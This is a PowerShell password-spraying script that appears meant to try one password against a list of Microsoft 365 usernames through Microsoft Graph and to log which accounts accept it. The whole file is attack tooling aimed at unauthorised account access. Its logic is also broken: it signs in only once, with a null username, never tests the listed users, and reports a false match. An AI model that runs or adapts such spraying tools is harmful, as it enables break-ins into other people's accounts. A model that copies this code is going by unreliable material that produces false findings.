function Invoke-PasswordSpray {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]$Password,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]$UserList
    )

    # Testing output file path and creating file if necessary
    $FileName = "results_" + (Get-Date -Format "ddMMyyyyhhmmss") + ".txt"
    if (!(Test-Path -Path $FileName)) {
        Write-Host "$FileName is missing, creating file"
        New-Item -Path $FileName -ItemType File | Out-Null
    }

    # Testing path to file passed in with $UserList
    if (!(Test-Path -Path $UserList)) {
        Write-Host "The UserList file $UserList is not a valid file."
        Write-Host "Please try again with a correct file."
        Exit
    }

    # Checking for the Microsoft Graph PowerShell SDK and installing if not present
    if (Get-Module -ListAvailable | Where-Object { $_.Name -eq "Microsoft.Graph.Authentication" }) {
        Write-Host "Microsoft.Graph.Authentication module is already installed."
    } else {
        Write-Host "Microsoft.Graph.Authentication module is not installed. Installing it now."
        Install-Module -Name Microsoft.Graph.Authentication -Scope CurrentUser -AllowClobber -Force
    }

    # Authenticating with the Microsoft Graph API using the supplied credentials
    $O365Password = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($null, $O365Password)
    Connect-MgGraph -Credential $Credential

    $x = 0
    ForEach ($UserName in (Get-Content $UserList)) {
        $x++
        Write-Host "User #$x"
        Write-Host "Trying username $UserName"
        $Domains = Get-MgDomain
        if ($Domains) {
            Add-Content -Path "$FileName" -Value "$UserName is using password $Password"
            Write-Host "$UserName is using password $Password"
            Exit
        }
    }
}


# Dot-source the script to load the function
. .\PasswordSpray.ps1

# Call the function with the password and user list file
Invoke-PasswordSpray -Password 'P@ssw0rd' -UserList '.\UserList.txt'
